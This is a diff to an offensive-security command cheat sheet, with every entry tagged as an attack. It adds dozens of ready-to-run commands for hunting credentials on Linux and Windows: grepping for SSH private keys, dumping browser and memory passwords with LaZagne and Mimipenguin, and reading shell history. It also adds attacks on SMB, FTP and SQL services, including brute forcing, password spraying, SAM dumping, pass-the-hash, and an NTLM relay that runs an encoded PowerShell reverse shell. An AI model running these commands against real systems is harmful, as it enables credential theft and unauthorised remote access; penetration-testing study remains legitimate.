@@ -492,7 +492,7 @@ echo "bitsadmin /transfer n <TargetFileURL> C:\Temp\<windowsOut>"
 ##  file transfers - windows - certutil download
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-echo "certutil.exe -urlcache -split -f <TargetFileURL>"
+echo "certutil.exe -verifyctl -split -f <TargetFileURL>"
 ```
 ##  file transfers - linux - wget download
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
@@ -782,7 +782,7 @@ nxc smb <ip> -u <user> -d <domain> -H <Hash>
 nxc ldap <ip> -u <user> -p '<password>' --asreproast output.txt
 ```
 
-## password attacks - local - windows credential hunting LaZagne
+## password attacks - local - windows credential hunting lazagne
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
 echo "start lazagne.exe all"
@@ -791,6 +791,417 @@ echo "start lazagne.exe all"
 ## password attacks - local - windows credential hunting findstr
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
-findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+findstr /SIM /C:"<keyword>" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
 
+## password attacks - local - linux credential hunting bash
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+
+## password attacks - local - linux credential hunting bash config files
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+```
+
+## password attacks - local - linux credential hunting bash databases
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+```
+
+## password attacks - local - linux credential hunting find notes
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+find /home/* -type f -name "*.txt" -o ! -name "*.*"
+```
+
+## password attacks - local - linux credential hunting find scripts
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+```
+
+## password attacks - local - linux credential hunting cronjobs
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+cat /etc/crontab 
+```
+
+## password attacks - local - linux credential hunting ssh private keys
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
+```
+
+## password attacks - local - linux credential hunting ssh public keys
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
+```
+
+## password attacks - local - linux credential hunting history
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+tail -n5 /home/*/.bash*
+```
+
+## password attacks - local - linux credential hunting logs
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
+
+## password attacks - local - linux credential hunting memory Mimipenguin python
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+sudo python3 mimipenguin.py
+```
+
+## password attacks - local - linux credential hunting memory Mimipenguin bash
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+sudo bash mimipenguin.sh
+```
+
+## password attacks - local - linux credential hunting lazagne
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+sudo python2.7 laZagne.py all
+```
+
+## password attacks - local - linux credential hunting firefox stored credentials
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ls -l .mozilla/firefox/ | grep default
+```
+
+## password attacks - local - linux credential hunting decrypt firefox profile
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+python3 firefox_decrypt.py
+```
+
+## password attacks - local - linux credential hunting browsers lazagne
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+python3 laZagne.py browsers
+```
+
+## attacking common services - smb cmd - net use
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+net use n: \\<ip>\<share>
+```
+
+## attacking common services - smb cmd - net use authenticated
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+net use n: \\<ip>\<share> /user:<user> <password>
+```
+
+## attacking common services - smb mounted - files and subdirectories from mounted smb
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+dir n: /a-d /s /b | find /c ":\"
+```
+
+## attacking common services - smb mounted - search creds on files from mounted smb
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+dir n:\*cred* /s /b
+dir n:\*secret* /s /b
+```
+
+## attacking common services - smb mounted - find specific string from mounted smb
+#plateform/linux #target/local #port/ #protocol/ #cat/ATTACK/
+```
+findstr /s /i <cred/term> n:\*.*
+```
+
+## attacking common services - smb powershell - list smb contents
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+Get-ChildItem \\<IP>\<share>\
+```
+
+## attacking common services - smb powershell - mount smb
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+New-PSDrive -Name "N" -Root "\\<IP>\<share>" -PSProvider "FileSystem"
+```
+
+## attacking common services - smb powershell - mount smb with credentials
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+$username = '<username>'
+$password = '<password>'
+$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+New-PSDrive -Name "N" -Root "\\<IP>\<share>" -PSProvider "FileSystem" -Credential $cred
+```
+
+## attacking common services - smb powershell - count files and directories
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+N:
+(Get-ChildItem -File -Recurse | Measure-Object).Count
+```
+
+## attacking common services - smb powershell - search creds
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+Get-ChildItem -Recurse -Path N:\ -Include *<cred/term>* -File
+```
+
+## attacking common services - smb powershell - 
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+Get-ChildItem -Recurse -Path N:\ | Select-String "<cred/term>" -List
+```
+
+## attacking common services - smb linux - smb mount
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sudo mkdir /mnt/<share>
+sudo mount -t cifs -o username=<username>,password=<password>,domain=. //<ip>/<share> /mnt/<share>  
+```
+
+## attacking common services - smb linux - smb credential file
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+mount -t cifs //<ip>/<share> /mnt/<share> -o=<pathToCredentialFile>
+```
+
+## attacking common services - smb linux - create creds file
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+echo "username=<username>" > credsFile
+echo "password=<password>" >> credsFile
+echo "domain=." >> credsFile 
+```
+
+## attacking common services - smb linux - find cred file
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+find /mnt/<share>/ -name *cred* 
+```
+
+## attacking common services - smb linux - files that combine string creds
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+grep -rn /mnt/<share>/ -ie cred
+```
+
+## attacking common services - mssql - sqsh
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sqsh -S <ip> -U <username> -P <password>
+```
+
+## attacking common services - mssql - sqlcmd connection
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sqlcmd -S <ip> -U <username> -P <password>
+```
+
+## attacking common services - mysql connection
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+mysql -u <username> -p<password> -h <ip>
+```
+
+## attacking common services - ftp - nmap ftp script scan
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sudo nmap -sC -sV -p 21 <ip> 
+```
+
+## attacking common services - ftp - test anonymous login
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ftp <ip>
+```
+
+## attacking common services - ftp medusa brute forcing
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+medusa -u <user> -P <PathTopassFile> -h <ip> -M ftp 
+```
+
+## attacking common services - ftp bounce attack
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nmap -Pn -v -n -p<-/orSpecifyPorts> -b <username>:<password>@<FTPserverIP> <SecondTargetIP>
+```
+
+## attacking common services - ftp brute force 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+hydra -L <userlist> -P <passlist> ftp://<ip>:<port>
+```
+
+## attacking common services - smb - smb NULL session
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+smbclient -N -L //<IP>
+```
+
+## attacking common services - smb - smb nmap
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sudo nmap <IP> -sV -sC -p139,445
+```
+
+## attacking common services - smb - smbmap
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+smbmap -H <IP>
+```
+
+## attacking common services - smb - recursive
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+smbmap -H <IP> -r <dir>
+```
+
+## attacking common services - smb - download file
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+smbmap -H <IP> --download "<dir/file>"
+```
+
+## attacking common services - smb - upload file
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+smbmap -H <IP> --upload <file2Upload> "<dir/outNameFile>"
+```
+
+
+## attacking common services - smb rpcclient - null session
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+rpcclient -U'%' <IP>
+```
+
+## attacking common services - smb rpcclient - automate smb enumeration
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+enum4linux <ip> -A -C
+```
+
+## attacking common services - smb - password spraying
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc smb <targetIP> -u <userlist> -p '<password2spray>' --local-auth
+```
+
+## attacking common services - smb - impacket psexec 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+impacket-psexec <username>:'<password>'@<targetIP>
+```
+
+## attacking common services - smb - nxc smb exec
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc smb <IP> -u <username> -p '<password>' -x '<command>' --exec-method smbexec
+```
+
+## attacking common services - smb - nxc enum logged on users
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc smb <IPsegment>/24 -u <username> -p '<password>' --loggedon-users
+```
+
+## attacking common services - smb - dump sam
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc smb <IP> -u <username> -p '<password>' --sam
+```
+
+## attacking common services - smb - pass the hash PtH
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nxc smb <IP> -u <username> -H <NThash>
+```
+
+## attacking common services - smb - Forced Authentication - reponder server
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+responder -I <interface name>
+```
+
+## attacking common services - smb - Forced Authentication - cracking responder hashes
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+hashcat -m 5600 <hashfile> <passwordList>
+```
+
+## attacking common services - smb - Forced Authentication - If we can't crack the hash - relay captured hash
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+cat /etc/responder/Responder.conf | grep 'SMB =' # switch it to Off
+```
+
+## attacking common services - smb - Forced Authentication - If we can't crack the hash - relay captured hash Pt.2
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t <IP>
+```
+
+## attacking common services - smb - Forced Authentication - If we can't crack the hash - relay captured hash Pt.2 - RevShell
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c 'powershell -e <base64RevShell>'
+```
+
+## attacking common services - smb - Forced Authentication - If we can't crack the hash - relay captured hash Pt.2 - RevShell listener
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nc -lvnp 9001
+```
+
+## attacking common services - sql - nmap mssql/mysql
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nmap -Pn -sV -sC -p<1433/3306> <IP>
+```
+
+## attacking common services - sql - mysql connection
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+mysql -u <username> -p<password> -h <IP>
+```
+
+## attacking common services - sql - mssql sqsh
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sqsh -S <IP> -U <username> -P '<password>' -h
+```
+
+## attacking common services - sql - mssql client
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+mssqlclient.py -p 1433 <username>@<IP> 
+```
+
+## attacking common services - sql - mssql sqsh domain
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sqsh -S <IP> -U <. or server name>\\<username> -P '<password>' -h
+```
+
+## 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+
+```
+
+## 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+
+```
